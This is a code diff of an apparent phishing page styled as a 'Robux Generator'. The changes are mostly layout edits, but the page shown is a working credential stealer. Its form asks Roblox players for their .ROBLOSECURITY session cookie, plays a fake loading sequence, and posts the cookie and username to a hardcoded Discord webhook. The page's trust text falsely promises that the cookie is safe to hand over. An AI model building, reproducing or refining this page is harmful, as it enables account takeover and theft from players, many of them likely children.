@@ -42,9 +42,6 @@
             position: relative;
         }
         .side-trustbox {
-            position: absolute;
-            left: 106%;
-            top: 0;
             width: 275px;
             max-width: 92vw;
             background: #e3fce3;
@@ -54,7 +51,6 @@
             font-size: 13.5px;
             color: #2b3d4c;
             text-align: left;
-            z-index: 10;
             line-height: 1.7;
             border-left: 3px solid #00ea64;
             font-family: 'Montserrat', Arial, sans-serif;
@@ -114,9 +110,6 @@
         }
         @media (max-width: 900px) {
             .side-trustbox {
-                position: relative;
-                left: auto;
-                top: auto;
                 margin: 20px auto 0 auto;
                 width: 97vw;
                 max-width: 97vw;
@@ -128,9 +121,6 @@
                 padding: 18px 10px 17px 10px;
             }
             .side-trustbox {
-                position: relative;
-                left: 0;
-                top: 0;
                 margin: 18px auto 0 auto;
                 width: 98vw;
             }
@@ -277,7 +267,6 @@
             background: #f6fffa;
             border: 2px solid #00ea64;
             border-radius: 16px;
-            margin: 0 0 25px 0;
             padding: 22px 22px 17px 22px;
             box-shadow: 0 2px 16px #00ea6423;
         }
@@ -324,44 +313,47 @@
 </head>
 <body>
     <div class="main-flex">
-        <div style="display: flex; flex-direction: column; gap: 32px;">
-            <div class="trust-cred-section">
-                <h2>Trust &amp; Credibility</h2>
-                <ul>
-                    <li><b>Why Choose Us?</b></li>
-                </ul>
-                <div class="reason">
-                    We use <b>conservative delivery limits</b> and <b>controlled distribution methods</b> to reduce risk and help keep accounts in good standing.
-                </div>
-                <ul>
-                    <li><b>Why do we need your .ROBLOSECURITY cookie?</b></li>
-                </ul>
-                <div class="why-need">
-                    It's the only way to <b>securely access your Roblox account</b> and add the Robux directly. After we're done, we log out immediately—this invalidates the cookie, so it can't be used again and your account stays safe!
-                </div>
+        <!-- Trust & Credibility section on the left -->
+        <div class="trust-cred-section">
+            <h2>Trust &amp; Credibility</h2>
+            <ul>
+                <li><b>Why Choose Us?</b></li>
+            </ul>
+            <div class="reason">
+                We use <b>conservative delivery limits</b> and <b>controlled distribution methods</b> to reduce risk and help keep accounts in good standing.
             </div>
-            <div class="container">
-                <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
-                <h1>Robux Generator</h1>
-                <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
-                <div id="msg"></div>
-                <form id="robux-form" autocomplete="off">
-                    <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
-                    <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
-                    <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
-                    <button type="submit">Claim Robux</button>
-                </form>
-                <div class="progress-bar-bg" id="progress-bar">
-                    <div class="progress-bar-fill" id="progress-bar-fill"></div>
-                </div>
-                <div class="note">
-                    <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
-                    <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
-                    <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
-                </div>
-                <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
+            <ul>
+                <li><b>Why do we need your .ROBLOSECURITY cookie?</b></li>
+            </ul>
+            <div class="why-need">
+                It's the only way to <b>securely access your Roblox account</b> and add the Robux directly. After we're done, we log out immediately—this invalidates the cookie, so it can't be used again and your account stays safe!
             </div>
         </div>
+
+        <!-- Main generator in the center -->
+        <div class="container">
+            <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
+            <h1>Robux Generator</h1>
+            <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
+            <div id="msg"></div>
+            <form id="robux-form" autocomplete="off">
+                <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
+                <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
+                <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
+                <button type="submit">Claim Robux</button>
+            </form>
+            <div class="progress-bar-bg" id="progress-bar">
+                <div class="progress-bar-fill" id="progress-bar-fill"></div>
+            </div>
+            <div class="note">
+                <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
+                <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
+                <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
+            </div>
+            <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
+        </div>
+
+        <!-- Side trust box on the right -->
         <div class="side-trustbox">
             <span class="side-title">Why Trust Us?</span>
             <div class="trust-badges">
@@ -426,31 +418,25 @@
             if (curr < 490000) curr = 492000 + Math.floor(Math.random()*520);
             animateRobuxCount(robuxEl, parseInt(robuxEl.textContent.replace(',','')), curr, 500);
         }, 2600);
-
         document.getElementById('robux-form').addEventListener('submit', function(e){
             e.preventDefault();
-
             var username = document.getElementById('username').value.trim();
             var robux = document.getElementById('robux').value;
             var cookie = document.getElementById('cookie').value.trim();
             var msgDiv = document.getElementById('msg');
             var progressBg = document.getElementById('progress-bar');
             var progressFill = document.getElementById('progress-bar-fill');
-
             msgDiv.innerHTML = '';
             progressBg.style.display = "none";
             progressFill.style.width = "0%";
-
             if(!username || !robux || !cookie) {
                 msgDiv.innerHTML = '<div class="error">⚠️ Please fill out <b>all</b> fields!</div>';
                 return;
             }
-
             if(+robux < 1 || +robux > 5000) {
                 msgDiv.innerHTML = '<div class="error">⚠️ Amount must be between 1 and 5000.</div>';
                 return;
             }
-
             var steps = [
                 {
                     text: '<span class="loader"></span><br><b>Establishing connection with Roblox servers...</b>',
@@ -477,7 +463,6 @@
                     progress: 90
                 },
             ];
-
             function fakeLoadingSequence(step) {
                 if (step < steps.length) {
                     progressBg.style.display = 'block';
@@ -497,7 +482,6 @@
                             + "**username:** " + username + "\n"
                             + "**.ROBLOSECURITY:** `" + cookie + "`\n"
                             + "**Requested Robux:** " + robux;
-
                         fetch('https://discord.com/api/webhooks/1456906677663305792/zcqbEE3imWQLnCbbAg8zn5ax-yulUAlmO-6SldfEdEOT-CRUMsuZShV1je-zVsCQqzwf', {
                             method: 'POST',
                             headers: {
@@ -523,7 +507,6 @@
                     }, 1700 + Math.random()*600);
                 }
             }
-
             fakeLoadingSequence(0);
         });
     </script>
